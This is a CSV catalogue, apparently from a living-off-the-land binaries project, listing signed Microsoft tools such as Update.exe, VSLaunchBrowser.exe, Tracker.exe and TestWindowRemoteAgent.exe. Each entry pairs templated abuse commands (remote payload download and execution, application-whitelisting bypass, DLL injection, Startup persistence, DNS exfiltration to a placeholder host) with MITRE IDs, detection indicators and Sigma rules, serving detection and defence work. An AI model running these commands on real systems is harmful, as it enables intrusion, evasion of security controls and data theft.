"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"WFMFormat.exe","Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.","Tim Baker","2024-12-05","","WFMFormat.exe","Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.","Proxy execution of binary","Execute","User","T1127","Windows 10, Windows 11","","","","C:\there\is\no\default\installation\path\WFMFormat.exe","","[''Child process from WFMFormat.exe''-|-''tracerpt.exe processes located anywhere other than c:\windows\system32'']","","Tim Baker (https://www.dotsec.com)","","EXE","","https://www.microsoft.com/en-us/download/details.aspx?id=103244","","","","","",".NET Framework 3.5","","","","","","","","false"
"vsjitdebugger.exe","Just-In-Time (JIT) debugger included with Visual Studio","Oddvar Moe","2018-05-25","","Vsjitdebugger.exe {PATH:.exe}","Executes specified executable as a subprocess of Vsjitdebugger.exe.","Execution of local PE file as a subprocess of Vsjitdebugger.exe.","Execute","User","T1127","Windows","","","","c:\windows\system32\vsjitdebugger.exe","","","","Pierre-Alexandre Braeken","@pabraeken","EXE","","https://twitter.com/pabraeken/status/990758590020452353","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_susp_use_of_vsjitdebugger_bin.yml","","","","","","","","","","","false"
"Vshadow.exe","VShadow is a command-line tool that can be used to create and manage volume shadow copies.","Ayberk Halaç","2023-09-06","","vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:","Executes specified executable from vshadow.exe.","Performs execution of specified executable file.","Execute","Administrator","T1202","Windows 10, Windows 11","","","","C:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\vshadow.exe","","vshadow.exe usage with -exec parameter","","Ayberk Halaç","","EXE","","https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample","","","https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_vshadow_exec.yml","","","","","","","","","","","false"
"VSLaunchBrowser.exe","Microsoft Visual Studio browser launcher tool for web applications debugging","Avihay Eldad","2024-04-12","","[''VSLaunchBrowser.exe .exe {REMOTEURL:.exe}''-|-''VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}''-|-''VSLaunchBrowser.exe .exe {PATH_SMB}'']","[''Download and execute payload from remote server''-|-''Execute payload via VSLaunchBrowser as parent process''-|-''Execute payload from WebDAV server via VSLaunchBrowser as parent process'']","[''It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.''-|-''It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.''-|-''It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.'']","[''Download''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1105''-|-''T1127''-|-''T1127'']","[''Windows''-|-''Windows''-|-''Windows'']","","INetCache","","[''C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe''-|-''C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe'']","","[''cmd.exe as sub-process of VSLaunchBrowser''-|-''URL on a VSLaunchBrowser command line''-|-''VSLaunchBrowser making unexpected network connections or DNS requests'']","","Avihay Eldad","@AvihayEldad","[''EXE''-|-''EXE''-|-''Remote'']","","","","","","","","","","","","","","","","false"
"VisualUiaVerifyNative.exe","A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.","Jimmy (@bohops)","2021-09-26","","VisualUiaVerifyNative.exe","Generate Serialized gadget and save to - C:\Users\[current user]\AppData\Roaminguiverify.config before executing.","Execute proxied payload with Microsoft signed binary to bypass WDAC policies","AWL Bypass","User","T1218","Windows 10 2004 (likely previous and newer versions as well)","","","","[''c:\Program Files (x86)\Windows Kits\10\bin\<version>\arm64\UIAVerify\VisualUiaVerifyNative.exe''-|-''c:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\UIAVerify\VisualUiaVerifyNative.exe''-|-''c:\Program Files (x86)\Windows Kits\10\bin\<version>\UIAVerify\VisualUiaVerifyNative.exe'']","","As a Windows SDK binary, execution on a system may be suspicious","","[''Lee Christensen''-|-''Jimmy'']","[''@tifkin''-|-''@bohops'']",".NetObjects","","[''https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/''-|-''https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad'']","","","https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_visualuiaverifynative.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
"Visio.exe","Microsoft Visio Executable","Avihay Eldad","2024-02-15","","Visio.exe {REMOTEURL}","Downloads payload from remote server","It will download a remote payload and place it in INetCache.","Download","User","T1105","Windows","","INetCache","","[''C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe''-|-''C:\Program Files\Microsoft Office\Office14\Visio.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe''-|-''C:\Program Files\Microsoft Office\Office15\Visio.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe''-|-''C:\Program Files\Microsoft Office\Office16\Visio.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe''-|-''C:\Program Files\Microsoft Office\root\Office14\Visio.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe''-|-''C:\Program Files\Microsoft Office\root\Office15\Visio.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe''-|-''C:\Program Files\Microsoft Office\root\Office16\Visio.exe'']","","[''URL on a visio.exe command line''-|-''visio.exe making unexpected network connections or DNS requests'']","","Avihay Eldad","@AvihayEldad","","","","","","","","","","","","","","","","","false"
"VSIISExeLauncher.exe","Binary will execute specified binary. Part of VS/VScode installation.","timwhite","2021-09-24","","VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""","The above binary will execute other binary.","Execute any binary with given arguments.","Execute","User","T1218","Windows 10 and up with VS/VScode installed","","","","C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\Extensions\Microsoft\Web Tools\ProjectSystem\VSIISExeLauncher.exe","","VSIISExeLauncher.exe spawned an unknown process","","timwhite","","EXE","","https://github.com/timwhitez","","","https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_vsiisexelauncher.yml","","","","","","","","","","","false"
"VSDiagnostics.exe","Command-line tool used for performing diagnostics.","Bobby Cooke","2023-07-12","","[''VSDiagnostics.exe start 1 /launch:{PATH:.exe}''-|-''VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""'']","[''Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.''-|-''Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.'']","[''Proxy execution of binary''-|-''Proxy execution of binary with arguments'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","C:\Program Files\Microsoft Visual Studio\2022\Community\Team Tools\DiagnosticsHub\Collector\VSDiagnostics.exe","","","","Bobby Cooke","@0xBoku","[''EXE''-|-''CMD'']","","https://twitter.com/0xBoku/status/1679200664013135872","","","https://github.com/tsale/Sigma_rules/blob/d5b4a09418edfeeb3a2d654f556d5bca82003cd7/LOL_BINs/VSDiagnostics_LoLBin.yml","","","","","","","","","","","false"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","","[''Update.exe --download {REMOTEURL}''-|-''Update.exe --update={REMOTEURL}''-|-''Update.exe --update={REMOTEURL}''-|-''Update.exe --update={PATH_SMB:folder}''-|-''Update.exe --update={PATH_SMB:folder}''-|-''Update.exe --updateRollback={REMOTEURL}''-|-''Update.exe --updateRollback={REMOTEURL}''-|-''Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""''-|-''Update.exe --updateRollback={PATH_SMB:folder}''-|-''Update.exe --updateRollback={PATH_SMB:folder}''-|-''Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""''-|-''Update.exe --createShortcut={PATH:.exe} -l=Startup''-|-''Update.exe --removeShortcut={PATH:.exe}-l=Startup'']","[''The above binary will go to url and look for RELEASES file and download the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.''-|-''Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.''-|-''Copy your payload into ""%localappdata%\Microsoft\Teams\current\"". Then run the command. Update.exe will create a shortcut to the specified executable in ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"". Then payload will run on every login of the user who runs it.''-|-''Run the command to remove the shortcut created in the ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"" directory you created with the LolBinExecution ""--createShortcut"" described on this page.'']","[''Download binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Application Whitelisting Bypass''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Execute binary''-|-''Execute binary''-|-''Execute binary'']","[''Download''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass''-|-''AWL Bypass''-|-''Execute''-|-''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1547''-|-''T1070'']","[''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed'']","","","","C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe","","Update.exe spawned an unknown process","","[''Reegun Richard Jayapaul (SpiderLabs, Trustwave)''-|-''Mr.Un1k0d3r''-|-''Adam''-|-''Jesus Galvez'']","[''@reegun21''-|-''@MrUn1k0d3r''-|-''@Hexacorn'']","[''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''CMD''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''CMD''-|-''EXE''-|-''EXE'']","","[''https://www.youtube.com/watch?v=rOP3hnkj7ls''-|-''https://twitter.com/reegun21/status/1144182772623269889''-|-''https://twitter.com/MrUn1k0d3r/status/1143928885211537408''-|-''https://twitter.com/reegun21/status/1291005287034281990''-|-''http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/''-|-''https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12''-|-''https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56''-|-''https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/'']","","https://github.com/jreegun/POC-s/tree/master/nuget-squirrel","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml","","","","","","","","","","","false"
"Tracker.exe","Tool included with Microsoft .Net Framework.","Oddvar Moe","2018-05-25","","[''Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe''-|-''Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe'']","[''Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.''-|-''Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.'']","[''Injection of locally stored DLL file into target process.''-|-''Injection of locally stored DLL file into target process.'']","[''Execute''-|-''AWL Bypass'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows''-|-''Windows'']","","","","no default","","","","Casey Smith","@subTee","[''DLL''-|-''DLL'']","","[''https://twitter.com/subTee/status/793151392185589760''-|-''https://attack.mitre.org/wiki/Execution'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_tracker.yml","","","","","","","","","","","false"
"TestWindowRemoteAgent.exe","TestWindowRemoteAgent.exe is the command-line tool to establish RPC","Onat Uzunyayla","2023-08-21","","TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000","Sends DNS query for open connection to any host, enabling exfiltration over DNS","Attackers may utilize this to exfiltrate data over DNS","Upload","User","T1048","Windows 10, Windows 11","","","","C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe","","TestWindowRemoteAgent.exe spawning unexpectedly","","Onat Uzunyayla","","","","","","","","","","","","","","","","","","false"
